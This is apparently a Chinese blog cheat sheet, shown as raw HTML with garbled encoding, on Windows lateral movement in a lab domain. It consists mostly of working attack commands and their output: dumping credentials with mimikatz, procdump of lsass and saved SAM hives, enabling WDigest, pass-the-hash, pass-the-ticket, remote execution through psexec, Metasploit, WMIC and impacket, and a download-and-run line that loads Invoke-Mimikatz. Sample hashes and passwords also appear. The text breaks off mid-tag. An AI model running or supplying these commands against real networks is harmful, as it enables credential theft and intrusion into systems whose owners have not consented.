æœ¬åœ°        è¿œç¨‹                      ç½‘ç»œ</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">OK                     \\10.10.10.20\ipc$        Microsoft Windows Network</span><br><span class="line">å‘½ä»¤æˆåŠŸå®Œæˆã€‚</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="2-windowsè‡ªå¸¦å·¥å…·è·å–ä¿¡æ¯"><a href="#2-windowsè‡ªå¸¦å·¥å…·è·å–ä¿¡æ¯" class="headerlink" title="2.windowsè‡ªå¸¦å·¥å…·è·å–ä¿¡æ¯"></a>2.windowsè‡ªå¸¦å·¥å…·è·å–ä¿¡æ¯</h3><blockquote><p>å‰ææ˜¯å»ºç«‹ipc$è¿æ¥</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;dir \\10.10.10.20\c$</span><br><span class="line"> é©±åŠ¨å™¨ \\10.10.10.20\c$ ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚</span><br><span class="line"> å·çš„åºåˆ—å·æ˜¯ AA35-C001</span><br><span class="line"></span><br><span class="line"> \\10.10.10.20\c$ çš„ç›®å½•</span><br><span class="line"></span><br><span class="line">2021/06/22  14:58         1,379,216 accesschk.exe</span><br><span class="line">2021/07/23  13:25            17,368 demo.ps1</span><br><span class="line">2021/07/29  13:29            13,672 Get-GPPPassword.ps1</span><br><span class="line">2021/07/13  17:11            38,616 nc.exe</span><br><span class="line">2021/07/16  19:18           133,120 netview.exe</span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2021/07/23  12:49            37,667 powercat.ps1</span><br><span class="line">2021/07/28  21:01           600,580 PowerUp.ps1</span><br><span class="line">2021/07/10  14:52    &lt;DIR&gt;          Program Files</span><br><span class="line">2021/07/16  18:04    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2016/06/28  09:49           170,160 PsLoggedon.exe</span><br><span class="line">2021/07/16  17:44            53,248 PVEFindADUser.exe</span><br><span class="line">2021/07/17  15:29           974,235 SharpHound.ps1</span><br><span class="line">2021/07/23  13:06            17,416 shell.ps1</span><br><span class="line">2021/07/27  17:52            16,663 Sherlock.ps1</span><br><span class="line">2021/07/11  11:27    &lt;DIR&gt;          Users</span><br><span class="line">2021/07/17  11:04    &lt;DIR&gt;          Windows</span><br><span class="line">              12 ä¸ªæ–‡ä»¶      3,451,961 å­—èŠ‚</span><br><span class="line">               5 ä¸ªç›®å½• 51,462,012,928 å¯ç”¨å­—èŠ‚</span><br></pre></td></tr></table></figure><h3 id="3-è®¡åˆ’ä»»åŠ¡"><a href="#3-è®¡åˆ’ä»»åŠ¡" class="headerlink" title="3.è®¡åˆ’ä»»åŠ¡"></a>3.è®¡åˆ’ä»»åŠ¡</h3><h4 id="01-atå‘½ä»¤-server-2008ä¹‹å‰"><a href="#01-atå‘½ä»¤-server-2008ä¹‹å‰" class="headerlink" title="01.atå‘½ä»¤(server 2008ä¹‹å‰)"></a>01.atå‘½ä»¤(server 2008ä¹‹å‰)</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net time \\10.10.10.20    #æŸ¥çœ‹ç³»ç»Ÿæ—¶é—´</span><br><span class="line">copy calc.bat \\10.10.10.20\c$    #å¤åˆ¶æ–‡ä»¶åˆ°ç›®æ ‡ç³»ç»Ÿï¼ˆå†…å®¹ä¸ºcalc.exeï¼‰</span><br><span class="line">at \\10.10.10.20 0:0AM c:\calc.bat    #åˆ›å»ºè®¡åˆ’ä»»åŠ¡</span><br><span class="line">at \\10.10.10.20 id /delete    #åˆ é™¤è®¡åˆ’ä»»åŠ¡</span><br><span class="line">at \\10.10.10.20 0:0AM cmd.exe /c &quot;ipconfig &gt; c:/1.txt&quot;  #å†™å…¥æ–‡ä»¶</span><br><span class="line">type \\10.10.10.20\c$\1.txt  #æŸ¥çœ‹æ–‡ä»¶</span><br></pre></td></tr></table></figure><h4 id="02-schtaskså‘½ä»¤-server-2008ä¹‹å"><a href="#02-schtaskså‘½ä»¤-server-2008ä¹‹å" class="headerlink" title="02.schtaskså‘½ä»¤(server 2008ä¹‹å)"></a>02.schtaskså‘½ä»¤(server 2008ä¹‹å)</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 10.10.10.20 /tn demo /sc onstart /tr c:\calc.bat /ru system /f  #åˆ›å»ºä¸€ä¸ªdemoè®¡åˆ’ä»»åŠ¡</span><br><span class="line">schtasks /run /s 10.10.10.20 /i /tn &quot;demo&quot; #è¿è¡Œè®¡åˆ’ä»»åŠ¡</span><br><span class="line">schtasks /delete /s 10.10.10.20 /tn &quot;demo&quot; /f #åˆ é™¤è®¡åˆ’ä»»åŠ¡</span><br><span class="line">net use \\10.10.10.20\ipc$ /del /y  #åˆ é™¤ipc$è¿æ¥</span><br></pre></td></tr></table></figure><h2 id="0x02-windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–"><a href="#0x02-windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–" class="headerlink" title="0x02.windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–"></a>0x02.windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–</h2><blockquote><p>LM Hashä¸NTLM Hash</p><p>LM Hashä¸€å…±14ä½ï¼Œserver 2003ä»¥åä½¿ç”¨NTLM Hash</p></blockquote><h3 id="1-Getpassword"><a href="#1-Getpassword" class="headerlink" title="1.Getpassword"></a>1.Getpassword</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Getpassword.exe</span><br><span class="line"></span><br><span class="line">Authentication Id:0;363018</span><br><span class="line">Authentication Package:Kerberos</span><br><span class="line">Primary User:Administrator</span><br><span class="line">Authentication Domain:JIYE</span><br><span class="line"></span><br><span class="line">* User: Administrator</span><br><span class="line">* Domain: JIYE</span><br><span class="line">* Password: 11</span><br><span class="line"></span><br><span class="line">Authentication Id:0;997</span><br><span class="line">Authentication Package:Negotiate</span><br><span class="line">Primary User:LOCAL SERVICE</span><br><span class="line">Authentication Domain:NT AUTHORITY</span><br><span class="line"></span><br><span class="line">* User: </span><br><span class="line">* Domain: </span><br><span class="line">* Password: </span><br><span class="line"></span><br><span class="line">Authentication Id:0;996</span><br><span class="line">Authentication Package:Negotiate</span><br><span class="line">Primary User:WIN7DC1$</span><br><span class="line">Authentication Domain:JIYE</span><br><span class="line"></span><br><span class="line">* User: WIN7DC1$</span><br><span class="line">* Domain: JIYE</span><br><span class="line">* Password: 1G-\ K=Ae q-70DKy+%W7O:02&#x27;JrVV7P^w?A&amp;Po\R./j9TSdQp2tc1W);vJN9.Q5Qov9 -l;`H%W4xcb&gt;J.\m!n*x$bM2r4c`=*%)Mu&quot;8TaBkTM]%Q%IpQs8</span><br><span class="line"></span><br><span class="line">Authentication Id:0;47004</span><br><span class="line">Authentication Package:NTLM</span><br><span class="line">Primary User:</span><br><span class="line">Authentication Domain:</span><br><span class="line"> (LUID ERROR) </span><br><span class="line"></span><br><span class="line">Authentication Id:0;999</span><br><span class="line">Authentication Package:Negotiate</span><br><span class="line">Primary User:WIN7DC1$</span><br><span class="line">Authentication Domain:JIYE</span><br><span class="line"></span><br><span class="line">* User: WIN7DC1$</span><br><span class="line">* Domain: JIYE</span><br><span class="line">* Password: 1G-\ K=Ae q-70DKy+%W7O:02&#x27;JrVV7P^w?A&amp;Po\R./j9TSdQp2tc1W);vJN9.Q5Qov9 -l;`H%W4xcb&gt;J.\m!n*x$bM2r4c`=*%)Mu&quot;8TaBkTM]%Q%IpQs8</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-PwDump7"><a href="#2-PwDump7" class="headerlink" title="2.PwDump7"></a>2.PwDump7</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PwDump7.exe</span><br><span class="line"></span><br><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">administration:1000:NO PASSWORD*********************:AE0597DC61A5C66B3A0600C60044C448:::</span><br></pre></td></tr></table></figure><h3 id="3-QuarksPwDump"><a href="#3-QuarksPwDump" class="headerlink" title="3.QuarksPwDump"></a>3.QuarksPwDump</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe -h</span><br></pre></td></tr></table></figure><h3 id="4-é€šè¿‡SAMå’Œsystemæ–‡ä»¶è·å–å¯†ç "><a href="#4-é€šè¿‡SAMå’Œsystemæ–‡ä»¶è·å–å¯†ç " class="headerlink" title="4.é€šè¿‡SAMå’Œsystemæ–‡ä»¶è·å–å¯†ç "></a>4.é€šè¿‡SAMå’Œsystemæ–‡ä»¶è·å–å¯†ç </h3><p>ï¼ˆ1ï¼‰å¯¼å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰mimikatzè·å–hash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive  #sam.hiveä¸system.hiveåœ¨mimikatzç›®å½•ä¸‹</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰mimikatzç›´æ¥è·å–æœ¬åœ°SAM</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debugtoken::elevate  #ææƒè‡³systemlsadump::sam  #è·å–æœ¬åœ°SAMsekurlsa::logonpasswords  #è·å–æ˜æ–‡å¯†ç NTLM Hash</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰minikatzåœ¨çº¿è¯»å–SAMæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure><h3 id="5-mimikatzç¦»çº¿è¯»å–lsass-dmp"><a href="#5-mimikatzç¦»çº¿è¯»å–lsass-dmp" class="headerlink" title="5.mimikatzç¦»çº¿è¯»å–lsass.dmp"></a>5.mimikatzç¦»çº¿è¯»å–lsass.dmp</h3><blockquote><p>lsass.exeè¿›ç¨‹é‡Œé¢å«æœ‰æ˜æ–‡å¯†ç ä¸æ•£åˆ—å€¼</p><p>æ‰¾åˆ°lsass.exeè¿›ç¨‹ï¼Œå³é”®åˆ›å»ºå‚¨å­˜æ–‡ä»¶å³å¯å¯¼å‡º</p></blockquote><p><strong>å¯¼å‡ºæ–‡ä»¶ä½ç½®ï¼šC:\Users\administrator\AppData\Local\Temp\lsass.exe</strong></p><blockquote><p>ä¹Ÿå¯ä»¥ä½¿ç”¨procdump.exeå¯¼å‡ºlsass.dmpæ–‡ä»¶ï¼Œprodumpä¸ºå¾®è½¯å®˜æ–¹å·¥å…·ä¸ä¼šè¢«æŸ¥æ€</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><code>mimikatzè·å–lsass.dmpä¸­çš„æ•£åˆ—å€¼</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp  #å¯¼å…¥sekurlsa::logonpasswords full  #è·å–</span><br></pre></td></tr></table></figure><h3 id="6-powershellå¯¹æ•£åˆ—å€¼è¿›è¡Œdump"><a href="#6-powershellå¯¹æ•£åˆ—å€¼è¿›è¡Œdump" class="headerlink" title="6.powershellå¯¹æ•£åˆ—å€¼è¿›è¡Œdump"></a>6.powershellå¯¹æ•£åˆ—å€¼è¿›è¡Œdump</h3><p><code>nishangè„šæœ¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Import-Module .\Get-PassHashes.ps1PS C:\&gt; Get-PassHashesAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::administration:1000:aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448:::</span><br></pre></td></tr></table></figure><h3 id="7-powershellè¿œç¨‹åŠ è½½mimikatzè·å–å¯†ç ä¸æ•£åˆ—å€¼"><a href="#7-powershellè¿œç¨‹åŠ è½½mimikatzè·å–å¯†ç ä¸æ•£åˆ—å€¼" class="headerlink" title="7.powershellè¿œç¨‹åŠ è½½mimikatzè·å–å¯†ç ä¸æ•£åˆ—å€¼"></a>7.powershellè¿œç¨‹åŠ è½½mimikatzè·å–å¯†ç ä¸æ•£åˆ—å€¼</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;.\Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure><h3 id="8-å•æœºå¯†ç æŠ“å–"><a href="#8-å•æœºå¯†ç æŠ“å–" class="headerlink" title="8.å•æœºå¯†ç æŠ“å–"></a>8.å•æœºå¯†ç æŠ“å–</h3><blockquote><p>server 2012ä»¥ä¸Šé»˜è®¤å…³é—­WdigeståŠŸèƒ½ï¼Œserver 2012ä»¥ä¸‹ç‰ˆæœ¬å¦‚æœå®‰è£…äº†KB2871997ä¹Ÿæ— æ³•è·å–</p><p>å¼€å¯Wdigestçš„ä¸¤ç§æ–¹æ³•</p></blockquote><p>ï¼ˆ1ï¼‰ä½¿ç”¨reg addå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f  #å¼€å¯reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f  #å…³é—­</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰powershell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure><h2 id="0x03-å“ˆå¸Œä¼ é€’"><a href="#0x03-å“ˆå¸Œä¼ é€’" class="headerlink" title="0x03.å“ˆå¸Œä¼ é€’"></a>0x03.å“ˆå¸Œä¼ é€’</h2><h3 id="1-ä½¿ç”¨NTLM-Hashè¿›è¡Œå“ˆå¸Œä¼ é€’"><a href="#1-ä½¿ç”¨NTLM-Hashè¿›è¡Œå“ˆå¸Œä¼ é€’" class="headerlink" title="1.ä½¿ç”¨NTLM Hashè¿›è¡Œå“ˆå¸Œä¼ é€’"></a>1.ä½¿ç”¨NTLM Hashè¿›è¡Œå“ˆå¸Œä¼ é€’</h3><blockquote><p>ç¯å¢ƒ</p><p>åŸŸåï¼šjiye.net</p><p>IPï¼š10.10.10.10</p><p>ç”¨æˆ·åï¼šadministrator</p><p>NTLM Hashï¼šae0597dc61a5c66b3a0600c60044c448</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:jiye.net /ntlm:ae0597dc61a5c66b3a0600c60044c448&quot;</span><br></pre></td></tr></table></figure><p><code>åœ¨å¼¹å‡ºçš„system cmdè¾“å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\C$  #åˆ—å‡ºåŸŸæ§ç›®æ ‡æ–‡ä»¶å¤¹</span><br></pre></td></tr></table></figure><h3 id="2-ä½¿ç”¨AES-256å¯†é’¥è¿›è¡Œå“ˆå¸Œä¼ é€’"><a href="#2-ä½¿ç”¨AES-256å¯†é’¥è¿›è¡Œå“ˆå¸Œä¼ é€’" class="headerlink" title="2.ä½¿ç”¨AES-256å¯†é’¥è¿›è¡Œå“ˆå¸Œä¼ é€’"></a>2.ä½¿ç”¨AES-256å¯†é’¥è¿›è¡Œå“ˆå¸Œä¼ é€’</h3><blockquote><p>ç›®æ ‡ç³»ç»Ÿå®‰è£…KB2871997</p></blockquote><h2 id="0x04-ç¥¨æ®ä¼ é€’"><a href="#0x04-ç¥¨æ®ä¼ é€’" class="headerlink" title="0x04.ç¥¨æ®ä¼ é€’"></a>0x04.ç¥¨æ®ä¼ é€’</h2><h3 id="1-mimikatzè¿›è¡Œç¥¨æ®ä¼ é€’"><a href="#1-mimikatzè¿›è¡Œç¥¨æ®ä¼ é€’" class="headerlink" title="1.mimikatzè¿›è¡Œç¥¨æ®ä¼ é€’"></a>1.mimikatzè¿›è¡Œç¥¨æ®ä¼ é€’</h3><p>ï¼ˆ1ï¼‰å¯¼å‡ºå†…å­˜ä¸­çš„ç¥¨æ®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ¸…é™¤å†…å­˜ä¸­ç¥¨æ®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å°†é«˜æƒé™ç¥¨æ®æ³¨å…¥å†…å­˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt c:\mimikatz\tickets\[0;24329]-2-0-40e10000-Administrator@krbtgt-JIYE.NET.kirbi</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰åˆ—å‡ºç›®æ ‡æ–‡ä»¶å¤¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\C$</span><br></pre></td></tr></table></figure><h3 id="2-kekeoè¿›è¡Œç¥¨æ®ä¼ é€’"><a href="#2-kekeoè¿›è¡Œç¥¨æ®ä¼ é€’" class="headerlink" title="2.kekeoè¿›è¡Œç¥¨æ®ä¼ é€’"></a>2.kekeoè¿›è¡Œç¥¨æ®ä¼ é€’</h3><blockquote><p>ç¯å¢ƒ</p><p>åŸŸåï¼šjiye.net</p><p>IPï¼š10.10.10.10</p><p>ç”¨æˆ·åï¼šadministrator</p><p>NTLM Hashï¼šae0597dc61a5c66b3a0600c60044c448</p></blockquote><p>ï¼ˆ1ï¼‰ç”Ÿæˆç¥¨æ®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:administrator /domain:jiye.net /ntlm:ae0597dc61a5c66b3a0600c60044c448&quot;</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ¸…é™¤å†…å­˜ä¸­ç¥¨æ®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">kekeo#</span><span class="bash"> kerberos::purgeklist purge  <span class="comment">#windowè‡ªå¸¦</span></span></span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å¯¼å…¥ç¥¨æ®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\TGT_administrator@JIYE.NET_krbtgt~jiye.net@JIYE.NET.kirbi</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰åˆ—å‡ºç›®æ ‡æ–‡ä»¶å¤¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\C$</span><br></pre></td></tr></table></figure><h2 id="0x05-psexecçš„ä½¿ç”¨"><a href="#0x05-psexecçš„ä½¿ç”¨" class="headerlink" title="0x05.psexecçš„ä½¿ç”¨"></a>0x05.psexecçš„ä½¿ç”¨</h2><h3 id="1-PsToolså·¥å…·åŒ…ä¸­çš„psexec"><a href="#1-PsToolså·¥å…·åŒ…ä¸­çš„psexec" class="headerlink" title="1.PsToolså·¥å…·åŒ…ä¸­çš„psexec"></a>1.PsToolså·¥å…·åŒ…ä¸­çš„psexec</h3><p>ï¼ˆ1ï¼‰è·å–system shellï¼ˆéœ€è¦å»ºç«‹ipc$è¿æ¥ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 -s cmd.exe</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰è·å–administrator shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 cmd.exe</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ²¡æœ‰å»ºç«‹ipc$è¿æ¥çš„ä½¿ç”¨æ–¹æ³•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 -u administrator -p 11 cmd.exe</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰å‘½ä»¤å›æ˜¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.10 -s cmd.exe /c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h3 id="2-msf-ä¸­çš„psexec"><a href="#2-msf-ä¸­çš„psexec" class="headerlink" title="2.msf ä¸­çš„psexec"></a>2.msf ä¸­çš„psexec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/psexecmsf6 exploit(windows/smb/psexec) &gt; set rhosts 10.10.10.10rhosts =&gt; 10.10.10.10msf6 exploit(windows/smb/psexec) &gt; set smbdomain jiye.netsmbdomain =&gt; jiye.netmsf6 exploit(windows/smb/psexec) &gt; set smbuser administratorsmbuser =&gt; administratormsf6 exploit(windows/smb/psexec) &gt; set smbpass 11smbpass =&gt; 11msf6 exploit(windows/smb/psexec) &gt; set lhost 10.10.10.130lhost =&gt; 10.10.10.130msf6 exploit(windows/smb/psexec) &gt;run</span><br></pre></td></tr></table></figure><h2 id="0x08-WMICçš„ä½¿ç”¨"><a href="#0x08-WMICçš„ä½¿ç”¨" class="headerlink" title="0x08.WMICçš„ä½¿ç”¨"></a>0x08.WMICçš„ä½¿ç”¨</h2><h3 id="1-Windowsç³»ç»Ÿè‡ªå¸¦"><a href="#1-Windowsç³»ç»Ÿè‡ªå¸¦" class="headerlink" title="1.Windowsç³»ç»Ÿè‡ªå¸¦"></a>1.Windowsç³»ç»Ÿè‡ªå¸¦</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:10.10.10.10 /user:administrator /password:11 process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;type \\10.10.10.10\c$\ip.txt</span><br></pre></td></tr></table></figure><h3 id="2-impacketå·¥å…·åŒ…"><a href="#2-impacketå·¥å…·åŒ…" class="headerlink" title="2.impacketå·¥å…·åŒ…"></a>2.impacketå·¥å…·åŒ…</h3><p><code>ä¸»è¦ç”¨äºLinuxå‘windowç§»åŠ¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py administrator:11@10.10.10.10</span><br></pre></td></tr></table></figure><h3 id="3-wmiexec-vbsè°ƒç”¨wmi"><a href="#3-wmiexec-vbsè°ƒç”¨wmi" class="headerlink" title="3.wmiexec.vbsè°ƒç”¨wmi"></a>3.wmiexec.vbsè°ƒç”¨wmi</h3><p>ï¼ˆ1ï¼‰è·å–system shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell 10.10.10.10 administrator 11</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å‘½ä»¤å›æ˜¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs /cmd 10.10.10.10 administrator 11 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h3 id="4-Invoke-WmiCommand-ps1"><a href="#4-Invoke-WmiCommand-ps1" class="headerlink" title="4.Invoke-WmiCommand.ps1"></a>4.Invoke-WmiCommand.ps1</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">User=<span class="string">&quot;jiye\administrator&quot;</span>  <span class="comment">#ç›®æ ‡ç³»ç»Ÿç”¨æˆ·å$Password=ConvertTo-SecureString -String &quot;11&quot; -AsPlainText -Force  #ç›®æ ‡ç³»ç»Ÿå¯†ç $Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #æ•´åˆ$Remote=Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 10.10.10.10  #æ‰§è¡Œ$Remote.PaylaodOutput  #è¾“å‡º</span></span></span><br></pre></td></tr></table></figure><h3 id="5-Invoke-WMIMethod"><a href="#5-Invoke-WMIMethod" class="headerlink" title="5.Invoke-WMIMethod"></a>5.Invoke-WMIMethod</h3><p><code>Powershellè‡ªå¸¦</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">User=<span class="string">&quot;jiye\administrator&quot;</span>  <span class="comment">#ç›®æ ‡ç³»ç»Ÿç”¨æˆ·å$Password=ConvertTo-SecureString -String &quot;11&quot; -AsPlainText -Force  #ç›®æ ‡ç³»ç»Ÿå¯†ç $Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #æ•´åˆInvoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;10.10.10.10&quot;  -Credential $Cred  #è¿è¡Œcalc</span></span></span><br></pre></td></tr></table></figure><h2 id="0x09-smbexec"><a href="#0x09-smbexec" class="headerlink" title="0x09.smbexec"></a>0x09.smbexec</h2><h3 id="1-C-ç‰ˆ"><a href="#1-C-ç‰ˆ" class="headerlink" title="1.C++ç‰ˆ"></a>1.C++ç‰ˆ</h3><h3 id="2-impacketç‰ˆ"><a href="#2-impacketç‰ˆ" class="headerlink" 